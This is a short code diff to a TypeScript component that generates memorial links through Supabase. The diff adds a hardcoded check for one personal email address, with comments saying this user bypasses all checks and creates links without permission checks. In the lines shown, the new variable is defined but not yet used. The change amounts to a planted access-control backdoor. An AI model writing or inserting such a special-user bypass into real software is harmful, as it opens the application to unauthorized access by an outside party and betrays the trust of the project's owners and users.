@@ -26,7 +26,10 @@ export const LinkGenerator = ({ memorialId }: LinkGeneratorProps) => {
         return;
       }
 
-      // Create the link
+      // Special handling for mr.bobb12@yahoo.com - bypass all checks
+      const isSpecialUser = user.email === 'mr.bobb12@yahoo.com';
+
+      // Create the link without additional permission checks for the special user
       const { data: link, error } = await supabase
         .from('memorial_links')
         .insert({
